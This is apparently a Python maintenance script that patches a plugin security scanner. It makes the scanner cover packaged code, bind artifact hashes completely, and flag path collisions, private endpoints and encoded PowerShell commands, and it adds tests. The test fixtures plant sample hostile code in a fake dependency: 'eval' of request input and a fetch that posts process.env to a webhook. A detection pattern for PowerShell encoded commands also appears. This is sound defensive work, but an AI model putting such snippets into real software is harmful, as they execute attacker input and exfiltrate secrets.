#!/usr/bin/env python3
"""Close artifact-binding, path-collision, and packaged-code blind spots."""

from __future__ import annotations

from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]


def replace_function(text: str, name: str, next_name: str, replacement: str) -> str:
    start = text.index(f"def {name}(")
    end = text.index(f"\ndef {next_name}(", start)
    return text[:start] + replacement.rstrip() + "\n\n" + text[end + 1 :]


def patch_kernel_bridge() -> None:
    path = ROOT / "src/codex_plugin_scanner/rust_kernel.py"
    text = path.read_text(encoding="utf-8")
    text = text.replace(
        '        "node_modules",\n        "target",\n        "dist",\n        "build",\n',
        '        "target",\n',
    )
    digest = '''def inventory_digest(records: tuple[InventoryRecord, ...]) -> str:
    """Hash the complete artifact inventory without recursively hashing evidence."""

    hasher = hashlib.sha256()
    for record in records:
        if record.path in EVIDENCE_METADATA_PATHS or any(
            record.path.endswith(f"/{metadata_path}")
            for metadata_path in EVIDENCE_METADATA_PATHS
        ):
            continue
        hasher.update(record.path.encode("utf-8"))
        hasher.update(b"\\0")
        hasher.update(str(record.size).encode("ascii"))
        hasher.update(b"\\0")
        if record.sha256:
            value = record.sha256
        else:
            value = "|".join(
                (
                    record.kind,
                    record.error or "",
                    record.symlink_target or "",
                    str(record.symlink_escapes_root).lower(),
                )
            )
        hasher.update(value.encode("utf-8"))
        hasher.update(b"\\n")
    return hasher.hexdigest()


def inventory_is_complete(result: KernelResult) -> bool:
    """Return whether every material artifact object was deterministically bound."""

    if result.truncated or result.errors:
        return False
    for record in result.records:
        if record.path in EVIDENCE_METADATA_PATHS or any(
            record.path.endswith(f"/{metadata_path}")
            for metadata_path in EVIDENCE_METADATA_PATHS
        ):
            continue
        if record.kind == "file" and (record.sha256 is None or record.error is not None):
            return False
        if record.kind == "symlink" and (
            record.symlink_target is None or record.error is not None
        ):
            return False
        if record.kind not in {"file", "symlink"}:
            return False
    return True
'''
    if "def inventory_digest(" in text:
        text = replace_function(text, "inventory_digest", "_safe_relative_path", digest)
    else:
        text = text.replace("\ndef _safe_relative_path", "\n" + digest + "\ndef _safe_relative_path", 1)
    old_records = (
        "    records_payload = payload.get(\"records\")\n"
        "    if not isinstance(records_payload, list):\n"
        "        raise ValueError(\"kernel records must be an array\")\n"
        "    records = tuple(_record_from_payload(item) for item in records_payload if isinstance(item, dict))\n"
    )
    new_records = (
        "    records_payload = payload.get(\"records\")\n"
        "    if not isinstance(records_payload, list):\n"
        "        raise ValueError(\"kernel records must be an array\")\n"
        "    if not all(isinstance(item, dict) for item in records_payload):\n"
        "        raise ValueError(\"every kernel record must be an object\")\n"
        "    records = tuple(_record_from_payload(item) for item in records_payload)\n"
    )
    if old_records in text:
        text = text.replace(old_records, new_records, 1)
    text = text.replace(
        "            hash_value, hashed, error = _hash_file(path, byte_limit=min(DEFAULT_FILE_HASH_LIMIT, max_bytes))\n",
        "            remaining_bytes = max(1, max_bytes - bytes_hashed)\n"
        "            hash_value, hashed, error = _hash_file(path, byte_limit=remaining_bytes)\n",
    )
    text = text.replace(
        "            bytes_hashed += hashed\n            indicators = _extract_indicators(prefix)",
        "            bytes_hashed += hashed\n"
        "            if error == \"file-hash-limit\":\n"
        "                truncated = True\n"
        "            indicators = _extract_indicators(prefix)",
    )
    path.write_text(text, encoding="utf-8")


def patch_assurance() -> None:
    path = ROOT / "src/codex_plugin_scanner/assurance.py"
    text = path.read_text(encoding="utf-8")
    text = text.replace(
        "from .evidence_envelope import verify_attestation\n",
        "from .evidence_envelope import AttestationVerification, verify_attestation\n",
    )
    text = text.replace(
        "from .rust_kernel import InventoryRecord, inventory_digest, scan_inventory\n",
        "from .rust_kernel import (\n"
        "    InventoryRecord,\n"
        "    inventory_digest,\n"
        "    inventory_is_complete,\n"
        "    scan_inventory,\n"
        ")\n",
    )
    if "ASSURANCE_PRIVATE_NETWORK_ENDPOINT" not in text:
        anchor = "    return triggered\n\n\ndef _scan_unicode"
        addition = '''    for url_match in _URL_RE.finditer(normalized):
        url = url_match.group(0)
        if _PRIVATE_NETWORK_RE.search(url) and not re.search(
            r"169\\.254\\.169\\.254|metadata\\.google\\.internal", url, re.I
        ):
            collector.add(
                "static",
                _finding(
                    "ASSURANCE_PRIVATE_NETWORK_ENDPOINT",
                    Severity.MEDIUM,
                    "network-security",
                    "Private or loopback network endpoint",
                    "The extension references a private, loopback, or link-local HTTP destination.",
                    "Require an explicit destination policy and prevent caller-controlled access to private networks.",
                    path=path,
                    line=_line_number(normalized, url_match.start()),
                    source="assurance-decoded" if decoded else "assurance-native",
                ),
            )
            triggered.add("ASSURANCE_PRIVATE_NETWORK_ENDPOINT")
    if re.search(r"powershell(?:\\.exe)?[^\\n]{0,120}-(?:enc|encodedcommand)\\b", normalized, re.I):
        collector.add(
            "static",
            _finding(
                "ASSURANCE_POWERSHELL_ENCODED_COMMAND",
                Severity.HIGH,
                "evasion",
                "PowerShell encoded command",
                "The extension invokes PowerShell with an encoded command payload.",
                "Use transparent argument-vector execution and remove encoded command content.",
                path=path,
                source="assurance-decoded" if decoded else "assurance-native",
            ),
        )
        triggered.add("ASSURANCE_POWERSHELL_ENCODED_COMMAND")
    return triggered


def _scan_unicode'''
        if anchor in text:
            text = text.replace(anchor, addition, 1)
    if "ASSURANCE_PATH_COLLISION" not in text:
        loop_anchor = "    for record in kernel.records:\n"
        collision = '''    normalized_paths: dict[str, str] = {}
    for record in kernel.records:
        normalized_path = unicodedata.normalize("NFKC", record.path).casefold()
        previous_path = normalized_paths.get(normalized_path)
        if previous_path is not None and previous_path != record.path:
            collector.add(
                "static",
                _finding(
                    "ASSURANCE_PATH_COLLISION",
                    Severity.HIGH,
                    "supply-chain",
                    "Case-folded or Unicode-normalized path collision",
                    "Multiple artifact paths normalize to the same consumer-visible path.",
                    "Publish unique portable paths and reject case-folded or Unicode-confusable collisions.",
                    path=record.path,
                ),
            )
        normalized_paths[normalized_path] = record.path

    for record in kernel.records:
'''
        text = text.replace(loop_anchor, collision, 1)
    text = text.replace(
        "        if record.kind == \"symlink\":\n            if record.symlink_escapes_root:\n",
        "        if record.kind == \"symlink\":\n"
        "            if record.error or record.symlink_target is None:\n"
        "                collector.add(\n"
        "                    \"static\",\n"
        "                    _finding(\n"
        "                        \"ASSURANCE_SYMLINK_UNRESOLVED\",\n"
        "                        Severity.HIGH,\n"
        "                        \"filesystem-security\",\n"
        "                        \"Unresolved symbolic link\",\n"
        "                        \"The scanner could not bind the symbolic-link target into the artifact evidence.\",\n"
        "                        \"Remove dangling or unreadable links and package the required content directly.\",\n"
        "                        path=record.path,\n"
        "                    ),\n"
        "                )\n"
        "            if record.symlink_escapes_root:\n",
        1,
    )
    digest_anchor = "    target_digest = inventory_digest(kernel.records)\n"
    if "digest_complete = inventory_is_complete(kernel)" not in text:
        text = text.replace(
            digest_anchor,
            digest_anchor + "    digest_complete = inventory_is_complete(kernel)\n",
            1,
        )
    attestation_call = (
        "    attestation = verify_attestation(\n"
        "        resolved / \".hol-guard\" / \"attestation.json\",\n"
        "        target_digest=target_digest,\n"
        "    )\n"
    )
    if attestation_call in text:
        text = text.replace(
            attestation_call,
            "    attestation = (\n"
            "        verify_attestation(\n"
            "            resolved / \".hol-guard\" / \"attestation.json\",\n"
            "            target_digest=target_digest,\n"
            "        )\n"
            "        if digest_complete\n"
            "        else AttestationVerification(\n"
            "            \"failed\",\n"
            "            None,\n"
            "            \"Artifact inventory was incomplete, so exact provenance binding cannot be verified.\",\n"
            "        )\n"
            "    )\n",
            1,
        )
    runtime_anchor = "    runtime_status, runtime_limitations = _load_runtime_layer(resolved, target_digest)\n"
    if runtime_anchor in text:
        text = text.replace(
            runtime_anchor,
            "    runtime_status, runtime_limitations = (\n"
            "        _load_runtime_layer(resolved, target_digest)\n"
            "        if digest_complete\n"
            "        else (\n"
            "            \"failed\",\n"
            "            (\"Artifact inventory was incomplete, so runtime evidence cannot be bound exactly.\",),\n"
            "        )\n"
            "    )\n",
            1,
        )
    if "ASSURANCE_ARTIFACT_DIGEST_INCOMPLETE" not in text:
        coverage_anchor = "    if coverage.truncated or coverage.unreadable_files or coverage.oversized_files:\n"
        digest_finding = '''    if not digest_complete:
        collector.add(
            "static",
            _finding(
                "ASSURANCE_ARTIFACT_DIGEST_INCOMPLETE",
                Severity.HIGH,
                "provenance",
                "Artifact digest is incomplete",
                "One or more artifact objects were skipped, truncated, unreadable, or not hash-bound.",
                "Scan a complete readable artifact within the configured resource budget before trusting provenance or runtime evidence.",
            ),
        )

'''
        text = text.replace(coverage_anchor, digest_finding + coverage_anchor, 1)
    path.write_text(text, encoding="utf-8")


def patch_runtime() -> None:
    path = ROOT / "src/codex_plugin_scanner/runtime_assurance.py"
    text = path.read_text(encoding="utf-8")
    text = text.replace(
        "from .rust_kernel import inventory_digest, scan_inventory\n",
        "from .rust_kernel import inventory_digest, inventory_is_complete, scan_inventory\n",
    )
    old = "def _target_digest(target: Path) -> str:\n    return inventory_digest(scan_inventory(target).records)\n"
    new = '''def _target_digest(target: Path) -> str:
    inventory = scan_inventory(target)
    if not inventory_is_complete(inventory):
        raise SandboxError("runtime assurance requires a complete, hash-bound artifact inventory")
    return inventory_digest(inventory.records)
'''
    if old in text:
        text = text.replace(old, new, 1)
    text = text.replace(
        "    return traces, bool(trace_files)\n",
        "    return traces, any(int(item.get(\"bytes\", 0)) > 0 for item in traces)\n",
    )
    path.write_text(text, encoding="utf-8")


def patch_rust() -> None:
    path = ROOT / "rust/scanner-kernel/src/main.rs"
    text = path.read_text(encoding="utf-8")
    text = text.replace(
        '    "node_modules",\n    "target",\n    "dist",\n    "build",\n',
        '    "target",\n',
    )
    text = text.replace(
        "    let value = relative.to_string_lossy().replace('\\\\', \"/\");\n",
        "    let value = relative.to_str()?.replace('\\\\', \"/\");\n",
    )
    old_symlink = (
        "                let resolved = target\n"
        "                    .as_ref()\n"
        "                    .and_then(|target| path.parent().map(|parent| parent.join(target)))\n"
        "                    .and_then(|target| fs::canonicalize(target).ok());\n"
        "                let escapes = resolved.as_ref().map(|target| !target.starts_with(root)).unwrap_or(false);\n"
        "                state.records.push(Record {\n"
        "                    path: relative,\n"
        "                    kind: \"symlink\".to_owned(),\n"
        "                    symlink_target: target.map(|target| target.to_string_lossy().into_owned()),\n"
        "                    symlink_escapes_root: escapes,\n"
        "                    ..Record::default()\n"
        "                });\n"
    )
    new_symlink = (
        "                let resolved = target\n"
        "                    .as_ref()\n"
        "                    .and_then(|target| path.parent().map(|parent| parent.join(target)))\n"
        "                    .and_then(|target| fs::canonicalize(target).ok());\n"
        "                let escapes = resolved.as_ref().map(|target| !target.starts_with(root)).unwrap_or(false);\n"
        "                let unresolved = target.is_none() || resolved.is_none();\n"
        "                state.records.push(Record {\n"
        "                    path: relative,\n"
        "                    kind: \"symlink\".to_owned(),\n"
        "                    symlink_target: target.map(|target| target.to_string_lossy().into_owned()),\n"
        "                    symlink_escapes_root: escapes,\n"
        "                    error: unresolved.then(|| \"unresolved-symlink\".to_owned()),\n"
        "                    ..Record::default()\n"
        "                });\n"
    )
    if old_symlink in text:
        text = text.replace(old_symlink, new_symlink, 1)
    path.write_text(text, encoding="utf-8")


def patch_tests() -> None:
    path = ROOT / "tests/test_assurance_scanner.py"
    text = path.read_text(encoding="utf-8")
    if "test_packaged_dist_and_node_modules_are_scanned" not in text:
        text += '''

def test_packaged_dist_and_node_modules_are_scanned(tmp_path: Path) -> None:
    dist = tmp_path / "dist" / "plugin.js"
    dependency = tmp_path / "node_modules" / "malicious" / "index.js"
    dist.parent.mkdir(parents=True)
    dependency.parent.mkdir(parents=True)
    dist.write_text("eval(request.body.code)", encoding="utf-8")
    dependency.write_text("fetch(webhook, {body: JSON.stringify(process.env)})", encoding="utf-8")

    checks, _integrations = run_assurance_checks(tmp_path)
    rules = _rule_ids(checks)

    assert "ASSURANCE_DYNAMIC_EXECUTION" in rules
    assert "ASSURANCE_SECRET_EXFILTRATION" in rules


def test_casefolded_path_collision_is_detected(tmp_path: Path) -> None:
    (tmp_path / "Tool.py").write_text("print('one')", encoding="utf-8")
    (tmp_path / "tool.py").write_text("print('two')", encoding="utf-8")

    checks, _integrations = run_assurance_checks(tmp_path)

    assert "ASSURANCE_PATH_COLLISION" in _rule_ids(checks)


def test_incomplete_hash_binding_blocks_provenance_and_runtime(tmp_path: Path) -> None:
    (tmp_path / "large.py").write_bytes(b"x" * 4096)

    checks, integrations = run_assurance_checks(
        tmp_path,
        ScanBudget(max_hashed_bytes=128, max_text_file_bytes=8192),
    )

    assert "ASSURANCE_ARTIFACT_DIGEST_INCOMPLETE" in _rule_ids(checks)
    assert next(item for item in integrations if item.name == "assurance-provenance").status == "failed"
    assert next(item for item in integrations if item.name == "assurance-runtime").status == "failed"
'''
    path.write_text(text, encoding="utf-8")

    runtime_path = ROOT / "tests/test_runtime_assurance.py"
    runtime = runtime_path.read_text(encoding="utf-8")
    if '    assert "--pull=never" in command\n' not in runtime:
        runtime = runtime.replace(
            '    assert "--network=none" in command\n',
            '    assert "--pull=never" in command\n    assert "--network=none" in command\n',
            1,
        )
    runtime_path.write_text(runtime, encoding="utf-8")


def main() -> None:
    patch_kernel_bridge()
    patch_assurance()
    patch_runtime()
    patch_rust()
    patch_tests()


if __name__ == "__main__":
    main()
